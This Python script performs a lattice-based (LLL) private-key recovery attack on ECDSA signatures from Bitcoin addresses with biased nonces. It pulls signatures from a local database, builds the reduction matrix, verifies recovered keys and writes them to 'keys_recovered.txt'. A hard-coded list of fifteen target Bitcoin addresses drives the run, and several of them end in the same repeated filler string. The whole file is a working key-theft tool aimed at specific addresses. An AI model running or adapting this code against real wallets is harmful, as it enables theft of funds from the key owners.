import sqlite3
import collections
import json
import mpmath
from ecdsa import SECP256k1
from lattice_nonce_analyzer import verify_key
from fast_lll import fast_lll

P = SECP256k1.order
mpmath.mp.prec = 512

def solve_target(address, bits, d_mod):
    print(f"\nAttempting {address} | bits={bits} | d_mod={d_mod}")
    
    conn = sqlite3.connect('cryscout.db')
    cur = conn.cursor()
    cur.execute('SELECT r_int, s_int, z_int FROM signatures WHERE address = ?', (address,))
    rows = cur.fetchall()
    conn.close()
    
    unique_sigs = {}
    for r, s, z in rows:
        unique_sigs[(int(r), int(s))] = int(z)
        
    prepared = []
    mod = 1 << bits
    for (r, s), z in unique_sigs.items():
        s_inv = pow(s, -1, P)
        u = (s_inv * z) % P
        t = (s_inv * r) % P
        a_k = (u + t * d_mod) % mod
        prepared.append({'u': u, 't': t, 'a_k': a_k, 'r': r, 's': s})
        
    counts = collections.Counter([p['a_k'] for p in prepared])
    # Use signatures that contribute to the most common a_k
    best_ak = counts.most_common(1)[0][0]
    target_sigs = [p for p in prepared if p['a_k'] == best_ak]
    
    print(f"  Using {len(target_sigs)} sigs with a_k={best_ak} (out of {len(prepared)} unique)")
    
    if len(target_sigs) < 2:
        print("  Not enough signatures for this specific bias.")
        return False

    n = len(target_sigs)
    B = 1 << (256 - bits)
    inv_2b = pow(mod, -1, P)
    
    matrix = [[0] * (n + 2) for _ in range(n + 2)]
    for i in range(n):
        u_p = ((target_sigs[i]['u'] + target_sigs[i]['t'] * d_mod - target_sigs[i]['a_k']) * inv_2b) % P
        t_p = target_sigs[i]['t']
        matrix[i][i] = P
        matrix[n][i] = t_p
        matrix[n+1][i] = u_p
        
    matrix[n][n] = 1
    matrix[n+1][n+1] = B
    
    reduced = fast_lll(matrix)
    
    for row in reduced:
        d_prime = abs(int(row[n]))
        for dp in [d_prime, (P - d_prime) % P]:
            if dp == 0: continue
            d = (dp * mod + d_mod) % P
            if verify_key(d, address):
                print(f"!!! SUCCESS !!! Address: {address} | Key: {hex(d)}")
                with open("keys_recovered.txt", "a") as f:
                    f.write(f"{address}:{hex(d)}\n")
                return True
    return False

if __name__ == "__main__":
    targets = [
        # address, bits, d_mod
        ("1BeouDc6jtHpitvPz3gR3LQnBGb7dKRrtC", 8, 11),
        ("1EEU18ZvWrbMxdXY6XAbksv6XitZ6XitZ6", 9, 337),
        ("14Y8dJseG6oj3TQYSBJAn5Z3Av7YMDzdyY", 8, 218),
        ("1McbLy27nLVzJ4ubMnFm3jxnQ3nbq2mpr2", 8, 33),
        ("1Ew6GNbqrBJSsx7X6XAbksv6XitZ6XitZ6", 8, 21),
        ("136H7pe2zKBsMAuz6XAbksv6XitZ6XitZ6", 8, 95),
        ("1Jwzjwof732gygtjEokoDnHQzahXTAKRrt", 8, 56),
        ("1HpED69tpKSaEaWz6XAbksv6XitZ6XitZ6", 8, 95),
        ("1CLxmHRhoi9VpSjz6XAbksv6XitZ6XitZ6", 8, 141),
        ("18hFBPU81kC8V4Dp4iwdwQHakKa5TW2ZkJ", 8, 235),
        ("16MrRM5s4kGUBgKz6XAbksv6XitZ6XitZ6", 8, 163),
        ("14ug9BVtGnxY8ezvd5cr1PXHeXBYXkRrtC", 8, 107),
        ("1NU8wnimW4sQpB1iJBh5m7XtNazdiV2aKZ", 10, 935),
        ("1DNBerho595Vh17U4z3L5ZZFcN5Y52RrtC", 8, 66),
        ("1LXzGrDQqKqVBqxz6XAbksv6XitZ6XitZ6", 8, 163),
    ]
    
    for addr, b, dm in targets:
        # Resolve full address from DB
        import sqlite3
        conn = sqlite3.connect('cryscout.db')
        cur = conn.cursor()
        cur.execute("SELECT address FROM signatures WHERE address LIKE ? LIMIT 1", (addr[:15] + '%',))
        row = cur.fetchone()
        conn.close()
        if row:
            solve_target(row[0], b, dm)
